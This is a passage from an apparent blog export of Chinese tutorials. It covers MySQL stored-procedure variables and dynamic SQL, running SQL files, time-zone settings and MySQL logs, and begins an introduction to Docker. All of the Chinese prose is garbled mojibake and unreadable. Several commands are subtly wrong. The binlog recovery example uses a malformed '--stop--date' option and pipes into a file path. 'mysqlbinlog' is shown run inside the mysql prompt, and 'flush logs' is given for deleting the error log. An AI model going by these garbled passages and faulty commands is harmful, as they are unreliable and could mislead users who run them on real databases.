ä»¥ä¸‹ä¸¤ç‚¹æ˜¯å…¶ä¸­æ¯”è¾ƒé‡è¦çš„éƒ¨åˆ†ï¼š å…³äºå˜é‡çš„ä½¿ç”¨ åœ¨å­˜å‚¨è¿‡ç¨‹ä¸­ä½¿ç”¨åŠ¨æ€SQL è¯­å¥ å­˜å‚¨è¿‡ç¨‹ä¸­çš„å˜é‡MySQLå­˜å‚¨è¿‡ç¨‹å¸¸è§çš„å˜é‡ï¼šå±€éƒ¨å˜é‡ã€ç”¨æˆ·å˜é‡ã€ç³»ç»Ÿå˜é‡ã€‚ å±€éƒ¨å˜é‡åœ¨è¿‡ç¨‹ä½“ä¸­ï¼Œå¯ä»¥å£°æ˜å±€éƒ¨å˜é‡ï¼Œç”¨æ¥ä¸´æ—¶ä¿å­˜ä¸€äº›å€¼ã€‚ 1DECLARE var_name[, var_name] ... type [DEFAULT value]; å…¶ä¸­ï¼Œtypeä¸ºMySQLçš„æ•°æ®ç±»å‹ï¼Œå¦‚:intã€floatã€dateã€varchar(length) ã€‚ ä½¿ç”¨å±€éƒ¨å˜é‡æ—¶ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹ä¸¤ç‚¹ï¼š DECLAREç”¨æ¥å£°æ˜å±€éƒ¨å˜é‡ï¼Œä¸”DECLAREä»…è¢«ç”¨åœ¨BEGIN â€¦ ENDå¤åˆè¯­å¥é‡Œï¼Œå¹¶ä¸”å¿…é¡»åœ¨å¤åˆè¯­å¥çš„å¼€å¤´ï¼Œåœ¨ä»»ä½•å…¶å®ƒè¯­å¥ä¹‹å‰ï¼›å¯ä»¥è¢«ç”¨åœ¨åµŒå¥—çš„å—ä¸­ï¼Œé™¤äº†é‚£äº›ç”¨ç›¸åŒåå­—å£°æ˜å˜é‡çš„å—ã€‚ å¦‚æœè¦ç»™å˜é‡æä¾›ä¸€ä¸ªé»˜è®¤å€¼ï¼Œä½¿ç”¨DEFAULTå­å¥(å€¼å¯ä»¥æ˜¯å¸¸æ•°ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šä¸ºä¸€ä¸ªè¡¨è¾¾å¼)ï¼›å¦‚æœæ²¡æœ‰DEFAULTå­å¥ï¼Œåˆå§‹å€¼ä¸ºNULLã€‚ ç”¨æˆ·å˜é‡ç”¨æˆ·å˜é‡ä¸æ•°æ®åº“è¿æ¥æœ‰å…³ï¼šåœ¨å½“å‰è¿æ¥ä¸­å£°æ˜çš„å˜é‡ï¼Œåœ¨è¿æ¥æ–­å¼€çš„æ—¶å€™ï¼Œå°±ä¼šæ¶ˆå¤±ï¼›åœ¨æ­¤è¿æ¥ä¸­å£°æ˜çš„å˜é‡æ— æ³•åœ¨å¦ä¸€è¿æ¥ä¸­ä½¿ç”¨ã€‚ ç”¨æˆ·å˜é‡ä½¿ç”¨@å…³é”®å­—å»å®šä¹‰ã€‚ åœ¨å­˜å‚¨è¿‡ç¨‹ä¸­åŠ¨æ€æ‰§è¡ŒSQLå…¶å®è¿™ä¸ªç†è§£æˆä¸€å¥—æ¨¡ç‰ˆï¼Œåªè¦æŒ‰ç…§æ ‡å‡†å»æ‰§è¡Œè¿™å¥—æ¨¡ç‰ˆï¼Œå°±å¯ä»¥äº†ã€‚ 1234567891011121314151617181920212223242526272829303132333435-- è¿æ¥æ•°æ®åº“use databaseName;-- å®šä¹‰ç»“æŸç¬¦ä¸º $$delimiter $$-- åˆ¤æ–­æ˜¯å¦å­˜åœ¨è¯¥åç§°çš„å­˜å‚¨è¿‡ç¨‹ï¼Œå¦‚æœå­˜åœ¨å°±åˆ é™¤drop procedure if exists wk;-- åˆ›å»ºæ–°çš„å­˜å‚¨è¿‡ç¨‹create procedure wk()begin -- å£°æ˜å˜é‡ declare days int default 366; declare dates int;-- å¾ªç¯ä½“WHILE days - 1 &gt; 0 DO -- ä¸ºå˜é‡èµ‹å€¼ SET dates &#x3D; DATE_FORMAT(DATE_SUB(CURDATE(), INTERVAL dayofyear(now())- days DAY), &quot;%Y%m%d&quot;); SET days &#x3D; days - 1; -- æ‹¼æ¥è¡¨å set @table_name &#x3D; CONCAT(&quot;tableName&quot;, dates); -- æ‹¼æ¥éœ€è¦æ‰§è¡ŒSQL è¯­å¥ï¼Œåé¢çš„å†…å®¹éœ€è¦æ ¹æ®å®é™…æƒ…å†µæ›¿æ¢æ‰ SET @sql &#x3D; CONCAT(&quot;ALTER TABLE &quot;, @table_name, &quot; -- éœ€è¦æ‰§è¡Œçš„SQL &quot;); -- é¢„å¤„ç†åŠ¨æ€SQL è¯­å¥ï¼Œå…¶ä¸­stmt æ˜¯ä¸€ä¸ªå˜é‡ PREPARE stmt FROM @sql; -- æ‰§è¡ŒSQL è¯­å¥ EXECUTE stmt ; -- é‡Šæ”¾prepare deallocate prepare stmt;-- ç»“æŸå¾ªç¯end WHILE;-- ç»“æŸå®šä¹‰è¯­å¥end $$delimiter ;call wk(); å¤§è‡´ä¸Šå°±æ˜¯è¿™æ ·ï¼Œè‡³æ­¤ï¼Œä¸€ä¸ªå®Œæ•´çš„Mysql å­˜å‚¨è¿‡ç¨‹å°±å®Œæˆäº†ã€‚ å¦‚ä½•åœ¨ç»ˆç«¯æ‰§è¡ŒMysql æ–‡ä»¶ï¼Ÿ SQL è„šæœ¬å‡†å¤‡å¥½äº†ï¼Œæœ‰ä¸¤ç§æ–¹å¼å¯ä»¥æ‰§è¡Œå®ƒã€‚ æ–¹å¼ä¸€ï¼šä¸è¿›å…¥Mysql ç»ˆç«¯ï¼Œç›´æ¥åœ¨å‘½ä»¤è¡Œç»ˆç«¯æ‰§è¡Œ æ–¹å¼äºŒï¼šè¿›å…¥Mysql ç»ˆç«¯ï¼Œåœ¨Mysql ç»ˆç«¯ä¸­æ‰§è¡Œ è¿™ä¸¤ç§æ–¹å¼çš„å…±åŒç‚¹å°±æ˜¯éƒ½éœ€è¦å·²çŸ¥Mysql å¯†ç ã€‚ å¯¹äºæ–¹å¼ä¸€ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥æ‰§è¡Œï¼š 1mysql -u root -p &lt; .&#x2F;modify_user_table.sql å¯ä»¥æŒ‡å®šæ•°æ®åº“ï¼š 1mysql -u root -p databaseName &lt; .&#x2F;modify_user_table.sql å¯¹äºæ–¹å¼äºŒï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥æ‰§è¡Œï¼š 12345&#x2F;&#x2F; è¿›å…¥Mysql ç»ˆç«¯mysql -uroot -p &#x2F;&#x2F; æ‰§è¡ŒSQL æ–‡ä»¶source .&#x2F;modify_user_table.sql å‚è€ƒé“¾æ¥ Mysql ç»ˆç«¯æ‰§è¡ŒSQL æ–‡ä»¶ Mysql å­˜å‚¨è¿‡ç¨‹ä¸­çš„å˜é‡å®šä¹‰ Mysql ä¸­çš„å˜é‡å®šä¹‰å’Œèµ‹å€¼ Mysql å­˜å‚¨è¿‡ç¨‹ä¸­ä½¿ç”¨åŠ¨æ€SQL è¯­å¥","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Mysql æŸ¥çœ‹ä¿®æ”¹é»˜è®¤æ—¶åŒº","slug":"mysql-view-and-modify-the-default-time-zone","date":"2020-07-25T15:43:57.000Z","updated":"2020-07-25T15:45:03.233Z","comments":true,"path":"mysql-view-and-modify-the-default-time-zone/","link":"","permalink":"https://www.0x2beace.com/mysql-view-and-modify-the-default-time-zone/","excerpt":"åœ¨ä¹‹å‰çš„ç¬”è®°ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“äº†æ—¶åŒºç›¸å…³çš„æ¦‚å¿µï¼Œä»¥åŠå¦‚ä½•åœ¨PHP è·å–è®¾ç½®é»˜è®¤æ—¶åŒºã€‚ è¿™ç¯‡ç¬”è®°å°±æ¥å­¦ä¹ ä¸€ä¸‹å¦‚ä½•åœ¨Mysql ä¸Šè·å–è®¾ç½®é»˜è®¤æ—¶åŒºã€‚","text":"åœ¨ä¹‹å‰çš„ç¬”è®°ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“äº†æ—¶åŒºç›¸å…³çš„æ¦‚å¿µï¼Œä»¥åŠå¦‚ä½•åœ¨PHP è·å–è®¾ç½®é»˜è®¤æ—¶åŒºã€‚ è¿™ç¯‡ç¬”è®°å°±æ¥å­¦ä¹ ä¸€ä¸‹å¦‚ä½•åœ¨Mysql ä¸Šè·å–è®¾ç½®é»˜è®¤æ—¶åŒºã€‚ æŸ¥çœ‹é»˜è®¤æ—¶åŒº12345678mysql&gt; show variables like &quot;%time_zone%&quot;;+------------------+--------+| Variable_name | Value |+------------------+--------+| system_time_zone | CST || time_zone | SYSTEM |+------------------+--------+2 rows in set (0.01 sec) è®¾ç½®é»˜è®¤æ—¶åŒºè®¾ç½®å½“å‰ä¼šè¯12mysql&gt; SET time_zone &#x3D; &quot;+8.00&quot;;mysql&gt; show variables like &quot;%time_zone%&quot;; æ­¤ä¿®æ”¹åªä¼šå¯¹å½“å‰ä¼šè¯æœ‰æ•ˆã€‚ å…¨å±€è®¾ç½®1mysql&gt; SET global time_zone &#x3D; &quot;+8.00&quot;; éœ€è¦é‡å¯è¯¥ä¼šè¯ï¼Œè¯¥é…ç½®æ‰ç”Ÿæ•ˆã€‚ ç¼–è¾‘ my.ini123# æ‰“å¼€Mysql çš„é…ç½®æ–‡ä»¶ my.ini[mysqld]default-time_zone &#x3D; &#39;+8:00&#39; éœ€è¦é‡å¯Mysql æœåŠ¡ æ—¶é—´æ ¼å¼GMTï¼ˆGreenwich Mean Timeï¼‰ï¼šæ ¼æ—å¨æ²»æ ‡å‡†æ—¶é—´UTCï¼šä¸–ç•Œæ ‡å‡†æ—¶é—´CSTï¼ˆChina Standard Timeï¼‰ï¼šä¸­å›½æ ‡å‡†æ—¶é—´ GMT + 8 = UTC + 8 = CST å‚è€ƒé“¾æ¥ Mysql æŸ¥çœ‹ä¿®æ”¹æ—¶åŒº time_zone","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"äº†è§£ Mysql æ—¥å¿—","slug":"understanding-the-mysql-log","date":"2020-07-25T15:38:53.000Z","updated":"2020-07-31T12:39:49.199Z","comments":true,"path":"understanding-the-mysql-log/","link":"","permalink":"https://www.0x2beace.com/understanding-the-mysql-log/","excerpt":"æ—¥å¿—æ— è®ºåœ¨å“ªé‡Œéƒ½æ˜¯å°¤ä¸ºé‡è¦çš„å­˜åœ¨ï¼Œæ‰€ä»¥è¿™ç¯‡ç¬”è®°çš„ç›®çš„å°±æ˜¯äº†è§£Mysql æ—¥å¿—çš„ã€‚","text":"æ—¥å¿—æ— è®ºåœ¨å“ªé‡Œéƒ½æ˜¯å°¤ä¸ºé‡è¦çš„å­˜åœ¨ï¼Œæ‰€ä»¥è¿™ç¯‡ç¬”è®°çš„ç›®çš„å°±æ˜¯äº†è§£Mysql æ—¥å¿—çš„ã€‚ æ—¥å¿—ç®€ä»‹Mysql çš„æ—¥å¿—ä¸»è¦åˆ†ä¸ºå››ç±»ï¼Œä½¿ç”¨è¿™äº›æ—¥å¿—æ–‡ä»¶ï¼Œå¯ä»¥æŸ¥çœ‹Mysql å†…éƒ¨å‘ç”Ÿçš„äº‹æƒ…ï¼Œè¿™å››ç±»æ—¥å¿—åˆ†åˆ«æ˜¯ï¼š é”™è¯¯æ—¥å¿—ï¼šè®°å½•Mysql æœåŠ¡çš„å¯åŠ¨ã€è¿è¡Œæˆ–åœæ­¢MysqlæœåŠ¡æ—¶å‡ºç°çš„é—®é¢˜ã€‚ æŸ¥è¯¢æ—¥å¿—ï¼šè®°å½•å»ºç«‹çš„å®¢æˆ·ç«¯è¿æ¥å’Œæ‰§è¡Œçš„è¯­å¥ã€‚ äºŒè¿›åˆ¶æ—¥å¿—ï¼šè®°å½•æ‰€æœ‰æ›´æ”¹æ•°æ®çš„è¯­å¥ï¼Œå¯ä»¥ç”¨äºæ•°æ®æ¢å¤ã€‚ æ…¢æŸ¥è¯¢æ—¥å¿—ï¼šè®°å½•æ‰€æœ‰æ‰§è¡Œæ—¶é—´è¶…è¿‡ long_query_time çš„æ‰€æœ‰æŸ¥è¯¢æˆ–ä¸ä½¿ç”¨ç´¢å¼•çš„æŸ¥è¯¢ã€‚ äºŒè¿›åˆ¶æ—¥å¿—äºŒè¿›åˆ¶æ—¥å¿—ä¸»è¦è®°å½• Mysql æ•°æ®åº“çš„å˜åŒ–ã€‚äºŒè¿›åˆ¶æ—¥å¿—ä»¥ä¸€ç§æœ‰æ•ˆçš„æ ¼å¼ï¼Œå¹¶ä¸”æ˜¯äº‹åŠ¡å®‰å…¨çš„æ–¹å¼åŒ…å«æ›´æ–°æ—¥å¿—ä¸­å¯ç”¨çš„æ‰€æœ‰ä¿¡æ¯ã€‚ å¯åŠ¨å’Œè®¾ç½®äºŒè¿›åˆ¶æ—¥å¿—é»˜è®¤æƒ…å†µä¸‹ï¼ŒäºŒè¿›åˆ¶æ—¥å¿—æ˜¯å…³é—­çš„ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹mysql çš„é…ç½®æ–‡ä»¶æ¥å¯åŠ¨å’Œè®¾ç½®äºŒè¿›åˆ¶æ—¥å¿—ã€‚ é…ç½®æ–‡ä»¶ my.ini ä¸­æœ‰å‡ ä¸ªè®¾ç½®æ˜¯å…³äºäºŒè¿›åˆ¶æ—¥å¿—çš„ï¼š 1234567# å¦‚æœéœ€è¦å¯ç”¨ï¼Œå°±åœ¨ mysqld ç»„ä¸‹ï¼ŒåŠ ä¸Š log-bin é€‰é¡¹[mysqld]log-binlog-bin [&#x3D;path&#x2F; [filename] ]expire_logs_days &#x3D; 10max_binlog_size &#x3D; 100M log-binå®šä¹‰å¼€å¯äºŒè¿›åˆ¶æ—¥å¿—ï¼Œpath è¡¨ç¤ºæ—¥å¿—æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•è·¯å¾„ï¼Œfilename æŒ‡å®šäº†æ—¥å¿—æ–‡ä»¶çš„åç§°ã€‚ expire_logs_dayså®šä¹‰äº†Mysql æ¸…é™¤è¿‡æœŸæ—¥å¿—çš„æ—¶é—´ï¼Œå³äºŒè¿›åˆ¶æ—¥è‡³çš„è‡ªåŠ¨åˆ é™¤çš„å¤©æ•°ã€‚ max_binlog_sizeå®šä¹‰äº†å•ä¸ªæ–‡ä»¶çš„å¤§å°é™åˆ¶ï¼Œä¸èƒ½å°†å˜é‡è®¾ç½®ä¸ºå¤§äº1GBæˆ–è€…å°äº4096Bã€‚é»˜è®¤å€¼ä¸º1GB. å¦‚ä½•æ£€æŸ¥è‡ªå·±çš„äºŒè¿›åˆ¶æ—¥å¿—æ˜¯å¦å¼€å¯äº†å‘¢ï¼Ÿ è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š 1mysql&gt; show variables like &#39;log_%&#39;; æŸ¥çœ‹äºŒè¿›åˆ¶æ—¥å¿—æŸ¥çœ‹äºŒè¿›åˆ¶æ–‡ä»¶ä¸ªæ•°åŠæ–‡ä»¶åï¼Œå‰ææ˜¯å¼€å¯äº†äºŒè¿›åˆ¶æ—¥å¿—ï¼š 1mysql&gt; show binary logs; åˆ é™¤äºŒè¿›åˆ¶æ—¥å¿—Mysql ä¹Ÿä¸ºæˆ‘ä»¬æä¾›äº†åˆ é™¤äºŒè¿›åˆ¶æ—¥å¿—çš„æ–¹æ³•ï¼Œæœ‰ä¸¤ç§ï¼Œä½œç”¨ä¸ç›¸åŒã€‚ åˆ é™¤æ‰€æœ‰äºŒè¿›åˆ¶æ—¥å¿—æ–‡ä»¶ï¼š 1mysql&gt; RESET MASTER; åˆ é™¤æŒ‡å®šäºŒè¿›åˆ¶æ—¥å¿—æ–‡ä»¶ï¼š 12# å…¶ä¸­ï¼Œbinlog.000003 æ˜¯æŒ‡äºŒè¿›åˆ¶æ–‡ä»¶çš„åç§°mysql&gt; PURGE MASTER LOGS TO &quot;binlog.000003&quot;; ä½¿ç”¨äºŒè¿›åˆ¶æ—¥å¿—æ¢å¤æ•°æ®åº“å¦‚æœå¯ç”¨äº†Mysql çš„äºŒè¿›åˆ¶æ—¥å¿—ï¼Œåœ¨æ•°æ®åº“å‡ºç°æ„å¤–ä¸¢å¤±æ•°æ®æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ Mysqlbinlog å·¥å…·ä»æŒ‡å®šæ—¶é—´ç‚¹å¼€å§‹ï¼ˆä¾‹å¦‚ï¼Œæœ€åä¸€æ¬¡å¤‡ä»½ï¼‰ç›´åˆ°ç°åœ¨ã€‚ Mysqlbinlog æ¢å¤æ•°æ®åº“çš„è¯­æ³•å¦‚ä¸‹ï¼š 1mysql&gt; mysqlbinlog [option] filename | mysql -uuser -ppass å®ä¾‹ï¼šä½¿ç”¨Mysqlbinlog æ¢å¤Mysql æ•°æ®åº“åˆ°2019å¹´1æœˆ30æ—¥15:27:48æ—¶çš„çŠ¶æ€ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š 1mysqlbinlog --stop--date&#x3D;&quot;2019-01-30 15:27:48&quot; | path&#x2F;binlogfilename -uuser -ppass æš‚åœäºŒè¿›åˆ¶æ—¥å¿—åŠŸèƒ½å› ä¸ºä¿®æ”¹Mysql é…ç½®æ–‡ä»¶å¯ä»¥å¯ç”¨ã€åœç”¨äºŒè¿›åˆ¶æ—¥å¿—åŠŸèƒ½ï¼Œä½†æ˜¯éœ€è¦é‡å¯Mysql æœåŠ¡å™¨ã€‚Mysql ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ç§æ›´ç®€å•çš„æ–¹å¼å¯ä»¥æš‚åœè®°å½•äºŒè¿›åˆ¶æ—¥å¿—ã€‚ æš‚åœè®°å½•äºŒè¿›åˆ¶æ—¥å¿—ï¼š 1mysql&gt; SET sql_log_bin &#x3D; 0; æ¢å¤è®°å½•äºŒè¿›åˆ¶æ—¥å¿—ï¼š 1mysql&gt; SET sql_log_bin &#x3D; 1; é”™è¯¯æ—¥å¿—é”™è¯¯æ—¥å¿—æ–‡ä»¶åŒ…å«äº†å½“Mysqld å¯åŠ¨å’Œåœæ­¢æ—¶ï¼Œä»¥åŠæœåŠ¡å™¨åœ¨è¿è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿä»»ä½•ä¸¥é‡é”™è¯¯æ—¶çš„ç›¸å…³ä¿¡æ¯ã€‚é”™è¯¯æ—¥å¿—é»˜è®¤æ˜¯å¼€å¯çš„ã€‚ å¯åŠ¨å’Œè®¾ç½®é”™è¯¯æ—¥å¿—é€šè¿‡ä¿®æ”¹my.ini é…ç½®æ–‡ä»¶ï¼Œæ¥å¯ç”¨æˆ–è€…åœç”¨é”™è¯¯æ—¥å¿— 12345# å¦‚æœéœ€è¦å¯ç”¨ï¼Œå°±åœ¨ mysqld ç»„ä¸‹ï¼ŒåŠ ä¸Š log-error é€‰é¡¹[mysqld]log-errorlog-error&#x3D;[path&#x2F;filename] æŸ¥çœ‹é”™è¯¯æ—¥å¿—é¦–å…ˆä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹é”™è¯¯æ—¥å¿—çš„å­˜å‚¨è·¯å¾„ä»¥åŠæ–‡ä»¶åï¼š 1mysql&gt; show variables like &#39;log_error&#39;; åˆ é™¤é”™è¯¯æ—¥å¿—æ–‡ä»¶Mysql çš„é”™è¯¯æ—¥å¿—æ–‡ä»¶æ˜¯ä»¥æ–‡æœ¬æ–‡ä»¶çš„å½¢å¼å­˜å‚¨åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œå¯ä»¥ç›´æ¥åˆ é™¤ã€‚ 1mysql&gt; flush logs; é€šç”¨æŸ¥è¯¢æ—¥å¿—é€šç”¨æŸ¥è¯¢æ—¥å¿—è®°å½•äº†Mysql çš„æ‰€æœ‰æ“ä½œï¼ŒåŒ…æ‹¬å¯åŠ¨å’Œå…³é—­æœåŠ¡ã€æ‰§è¡ŒæŸ¥è¯¢å’Œæ›´æ–°è¯­å¥ç­‰ã€‚ å¯ç”¨å’Œè®¾ç½®é€šç”¨æŸ¥è¯¢æ—¥å¿—åŒæ ·çš„ï¼Œæ‰“å¼€Mysql çš„my.ini é…ç½®æ–‡ä»¶ã€‚ 1234[mysqld]loglog&#x3D;[path\\filename] è¿™é‡Œæœ‰ä¸¤ç§æ–¹å¼ï¼Œlog é€‰é¡¹åé¢å¦‚æœæ²¡æœ‰å¸¦ä»»ä½•å‚æ•°è¡¨ç¤ºä½¿ç”¨Mysql é»˜è®¤çš„å­˜å‚¨ä½ç½®ï¼Œä¸Šé¢çš„ä¹Ÿä¸€æ ·ã€‚ æŸ¥çœ‹é€šç”¨æŸ¥è¯¢æ—¥å¿—å¯ä»¥é€šè¿‡log è®¾ç½®çš„æ—¥å¿—æ–‡ä»¶å­˜å‚¨è·¯å¾„ï¼Œå»æŸ¥çœ‹å…·ä½“æ–‡ä»¶ã€‚ æ…¢æŸ¥è¯¢æ—¥å¿—æ…¢æŸ¥è¯¢æ—¥å¿—è®°å½•æŸ¥è¯¢æ—¶é•¿è¶…è¿‡æŒ‡å®šæ—¶é—´çš„æ—¥å¿—ã€‚é€šè¿‡æ…¢æŸ¥è¯¢æ—¥å¿—ï¼Œå¯ä»¥æ‰¾å‡ºæ‰§è¡Œæ—¶é—´è¾ƒé•¿ã€æ‰§è¡Œæ•ˆç‡è¾ƒä½çš„è¯­å¥ï¼Œç„¶åè¿›è¡Œä¼˜åŒ–ã€‚ å¯ç”¨å’Œè®¾ç½®æ…¢æŸ¥è¯¢æ—¥å¿—åŒæ ·çš„ï¼Œæ‰“å¼€ç¼–è¾‘Mysql çš„my.ini é…ç½®æ–‡ä»¶ï¼š 12345[mysqld]log-slow-querieslog-slow-queries&#x3D;[path\\filename]long_query_time&#x3D;n n è¡¨ç¤ºæŸ¥è¯¢æ—¶é—´çš„æé™å€¼ï¼Œå¦‚æœè¶…è¿‡äº†è¿™ä¸ªå€¼ï¼Œè¿™ä¸ªæŸ¥è¯¢è¿‡ç¨‹å°±ä¼šè¢«è®°å½•åˆ°æ…¢æŸ¥è¯¢æ—¥å¿—æ–‡ä»¶ä¸­ã€‚ æŸ¥è¯¢æ…¢æŸ¥è¯¢æ—¥å¿—åŒä¸Šã€‚ ä¸Šé¢è¿™äº›æ—¥å¿—é…ç½®çš„æ›´æ”¹éƒ½éœ€è¦é‡å¯æœåŠ¡å™¨æ‰èƒ½ç”Ÿæ•ˆï¼Œå¦å¤–è¿˜æœ‰ä¸€ç§æ–¹å¼å¯ä»¥æŸ¥çœ‹è¿è¡Œæ—¶æ—¥å¿—ã€‚ å¯ç”¨å®æ—¶æ—¥å¿—1234set global general_log &#x3D; on;&#x2F;&#x2F; æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶ç›®å½•show variables like &#39;general_log_file&#39;; è¿™ç§æ–¹å¼çš„å¥½å¤„å°±æ˜¯ä¸éœ€è¦é‡å¯Mysql æœåŠ¡ã€‚ å¦‚æœéœ€è¦ç¦ç”¨ï¼š 1set global general_log &#x3D; off; å…³äºå¹³æ—¶åº”è¯¥æ‰“å¼€å“ªäº›æ—¥å¿—çš„é—®é¢˜ã€‚ æ—¥å¿—çš„å¼€å¯æ—¢ä¼šå½±å“Mysql çš„æ€§èƒ½ï¼Œåˆä¼šå ç”¨å¤§é‡çš„ç£ç›˜ç©ºé—´ã€‚å› æ­¤å¦‚æœä¸å¿…è¦ï¼Œåº”å°½å¯èƒ½çš„å°‘å¼€å¯æ—¥å¿—ï¼Œæ ¹æ®ä¸åŒçš„ä½¿ç”¨ç¯å¢ƒï¼Œè€ƒè™‘å¼€å¯ä¸åŒçš„æ—¥å¿—ã€‚ ä¾‹å¦‚ï¼šåœ¨å¼€å‘ç¯å¢ƒä¸­ä¼˜åŒ–æŸ¥è¯¢ä½æ•ˆç‡çš„è¯­å¥ï¼Œå¯ä»¥å¼€å¯æ…¢æŸ¥è¯¢æ—¥å¿—ï¼›å¦‚æœéœ€è¦è®°å½•ç”¨çš„æ‰€æœ‰æŸ¥è¯¢æ“ä½œï¼Œå¯ä»¥å¼€å¯é€šç”¨æŸ¥è¯¢æ—¥å¿—ï¼›å¦‚æœéœ€è¦è®°å½•æ•°æ®çš„å˜æ›´ï¼Œå¯ä»¥å¼€å¯äºŒè¿›åˆ¶æ—¥å¿—ï¼›é”™è¯¯æ—¥å¿—é»˜è®¤å¼€å¯ï¼›","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Docker å¿«é€Ÿä¸Šæ‰‹","slug":"docker-quick-start","date":"2020-07-23T04:32:57.000Z","updated":"2020-08-22T01:02:14.223Z","comments":true,"path":"docker-quick-start/","link":"","permalink":"https://www.0x2beace.com/docker-quick-start/","excerpt":"è¿™ç¯‡ç¬”è®°çš„ä¸»è¦ç›®çš„æ˜¯ç”¨æ¥è®°å½•å­¦ä¹  Docker çš„è¿‡ç¨‹ã€‚Dockerè¿™ä¸ªè¯å¹¶ä¸æ˜¯ç¬¬ä¸€æ¬¡å¬è¯´äº†ï¼Œå°è±¡ä¸­å¥½ä¹…ä»¥å‰å°±å¬è¯´è¿‡è¿™ä¸ªä¸œè¥¿äº†ï¼Œåªæ˜¯ä¸€ç›´æ²¡æœ‰çœŸæ­£å»äº†è§£ã€‚","text":"è¿™ç¯‡ç¬”è®°çš„ä¸»è¦ç›®çš„æ˜¯ç”¨æ¥è®°å½•å­¦ä¹  Docker çš„è¿‡ç¨‹ã€‚Dockerè¿™ä¸ªè¯å¹¶ä¸æ˜¯ç¬¬ä¸€æ¬¡å¬è¯´äº†ï¼Œå°è±¡ä¸­å¥½ä¹…ä»¥å‰å°±å¬è¯´è¿‡è¿™ä¸ªä¸œè¥¿äº†ï¼Œåªæ˜¯ä¸€ç›´æ²¡æœ‰çœŸæ­£å»äº†è§£ã€‚ è¯ç”Ÿè½¯ä»¶å¼€å‘æœ€å¤§çš„éº»çƒ¦äº‹ä¹‹ä¸€ï¼Œå°±æ˜¯ç¯å¢ƒé…ç½®ã€‚ å¼€å‘è€…å¸¸å¸¸è¯´çš„ä¸€å¥è¯ï¼šå®ƒåœ¨æˆ‘çš„æœºå™¨ä¸Šå¯ä»¥è·‘äº†ã€‚è¨€ä¸‹ä¹‹æ„å°±æ˜¯ï¼Œå…¶ä»–æœºå™¨å¯èƒ½è·‘ä¸äº†ã€‚å› ä¸ºå¯ä»¥æ­£å¸¸è·‘çš„å‰ææ˜¯ï¼šæ“ä½œç³»ç»Ÿçš„è®¾ç½®ï¼Œå„ç§è½¯ä»¶å’Œç»„ä»¶ã€åº“çš„å®‰è£…ï¼Œåªæœ‰å®ƒä»¬éƒ½æ­£ç¡®äº†ï¼Œè½¯ä»¶æ‰èƒ½æ­£å¸¸è¿è¡Œã€‚ é…ç½®ç¯å¢ƒå¦‚æ­¤éº»çƒ¦ï¼Œæ¢ä¸€å°æœºå™¨ï¼Œå°±å¾—é‡æ¥ä¸€æ¬¡ï¼Œæ—·æ—¥è´¹æ—¶ã€‚å› æ­¤ï¼Œèªæ˜çš„äººä»¬å°±æƒ³åˆ°ï¼Œèƒ½ä¸èƒ½ä»æ ¹æœ¬ä¸Šè§£å†³é—®é¢˜ã€‚è½¯ä»¶å¯ä»¥å¸¦ç¯å¢ƒå®‰è£…ã€‚ï¼ˆè¿™é‡Œè¯´çš„è½¯ä»¶æ˜¯æŒ‡æœ€ç»ˆè¦è¿è¡Œçš„å·¥ç¨‹ï¼‰ è™šæ‹Ÿæœºè™šæ‹Ÿæœºï¼ˆvirtual machineï¼Œç®€ç§°VMï¼‰å°±æ˜¯å¸¦ç¯å¢ƒå®‰è£…çš„ä¸€ç§è§£å†³æ–¹æ¡ˆã€‚å®ƒå¯ä»¥åœ¨ä¸€ä¸ªæ“ä½œç³»ç»Ÿä¸­è¿è¡Œå¦å¤–ä¸€ç§æ“ä½œç³»ç»Ÿã€‚æ¯”å¦‚åœ¨Windowsç³»ç»Ÿä¸­è¿è¡ŒLinux ç³»ç»Ÿã€‚åº”ç”¨ç¨‹åºå¯¹æ­¤æ¯«æ— æ„Ÿè§‰ï¼Œå› ä¸ºè™šæ‹Ÿæœºçœ‹ä¸Šå»è·ŸçœŸæ˜¯ç³»ç»Ÿä¸€æ¨¡ä¸€æ ·ã€‚è€Œå¯¹äºåº•å±‚ç³»ç»Ÿæ¥è¯´ï¼Œè™šæ‹Ÿæœºå°±æ˜¯ä¸€ä¸ªæ™®é€šæ–‡ä»¶ï¼Œä¸éœ€è¦å°±åˆ æ‰ï¼Œå¯¹å…¶ä»–éƒ¨åˆ†æ²¡æœ‰å½±å“ã€‚ è™šæ‹Ÿæœºï¼ˆVMï¼‰æ˜¯ç‰©ç†ç¡¬ä»¶çš„æŠ½è±¡ï¼Œ å°†ä¸€å°æœåŠ¡å™¨è½¬å˜ä¸ºå¤šå°æœåŠ¡å™¨ã€‚ è™½ç„¶ç”¨æˆ·å¯ä»¥é€šè¿‡è™šæ‹Ÿæœºè¿˜åŸè½¯ä»¶çš„åŸå§‹ç¯å¢ƒï¼Œä½†æ˜¯è¿™ä¸ªæ–¹æ¡ˆæœ‰å‡ ä¸ªç¼ºç‚¹ã€‚åœ¨åé¢ä¼šåšæ¯”è¾ƒã€‚ 